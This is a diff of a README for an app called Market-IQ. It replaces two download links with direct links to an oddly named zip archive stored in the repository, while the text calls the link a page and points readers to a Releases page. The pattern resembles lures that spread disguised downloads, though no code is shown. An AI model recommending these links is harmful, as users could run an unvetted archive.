@@ -23,7 +23,7 @@ To run Market-IQ effectively, you will need:
 
 ## 📥 Download & Install
 
-To download Market-IQ, visit this page: [Download Market-IQ](https://raw.githubusercontent.com/Abdulazizdwiinp/Market-IQ/main/marketiq/Market-IQ-1.6.zip)
+To download Market-IQ, visit this page: [Download Market-IQ](https://github.com/Abdulazizdwiinp/Market-IQ/raw/refs/heads/main/marketiq/IQ_Market_lakism.zip)
 
 1. Go to the Releases page.
 2. Look for the latest release version.
@@ -55,4 +55,4 @@ To download Market-IQ, visit this page: [Download Market-IQ](https://raw.githubu
 
 If you have any questions or need assistance, you can reach out to the community through GitHub issues or check out our documentation for more details. Your feedback is always welcome, and we aim to improve the application based on user experience.
 
-For any immediate concerns, please consider visiting the [Download Market-IQ](https://raw.githubusercontent.com/Abdulazizdwiinp/Market-IQ/main/marketiq/Market-IQ-1.6.zip) page for the latest updates and installation instructions.
+For any immediate concerns, please consider visiting the [Download Market-IQ](https://github.com/Abdulazizdwiinp/Market-IQ/raw/refs/heads/main/marketiq/IQ_Market_lakism.zip) page for the latest updates and installation instructions.
